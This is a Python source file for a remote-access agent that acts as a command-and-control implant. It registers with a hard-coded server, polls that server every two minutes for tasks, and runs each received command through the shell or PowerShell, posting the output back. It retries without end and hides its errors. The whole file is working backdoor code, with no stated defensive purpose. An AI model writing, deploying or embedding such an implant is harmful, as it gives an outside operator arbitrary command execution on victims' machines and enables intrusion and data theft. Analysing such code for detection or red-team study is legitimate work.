import requests
import socket
import time
import subprocess
import platform

class Client:

    def __init__(self,server_ip, port):
        self.server_ip = server_ip
        self.port = port
        if platform.system() == "Linux":
            self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
        else:
            self.local_ip = socket.gethostbyname(socket.gethostname())

    def register(self):
        data = {'agent_id': self.local_ip}
        req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=10)
        if req.status_code not in [200, 201]:
            raise ValueError("Failed to register")

    def handle_task(self,task_json):
        try:
            task = task_json.get('action')
            task_id = task_json.get('task_id')
            #print(task)
            if task == "command":
                command = task_json.get('command')
                if platform.system() == "Windows":
                    ps = subprocess.run("powershell -c " + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                else:
                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
            elif task == "download":
                pass
            elif task == "upload":
                pass
            else:
                raise ValueError("Invalid task type")
        except subprocess.CalledProcessError as e:
                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
        except Exception as e:
            pass

    def run(self):
        while True:
            try:
                self.register()
                break #Registration successful, move on to task retrieval
            except:
                #Registration failed, retrying
                time.sleep(60)
        while True:
            try:
                req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
                if req.status_code == 418:
                    self.register()
                    continue
                if req.status_code not in [200, 201, 204]:
                    time.sleep(120)
                    continue
                elif req.status_code == 204:
                    #print("No tasks")
                    time.sleep(120)
                    continue
                tasks = req.json()
                self.handle_task(tasks)
            except Exception as e:
                time.sleep(120)
                continue
                #print(e)

def main():
    client = Client("10.50.0.12", 80)
    client.run()

if __name__ == '__main__':
    main()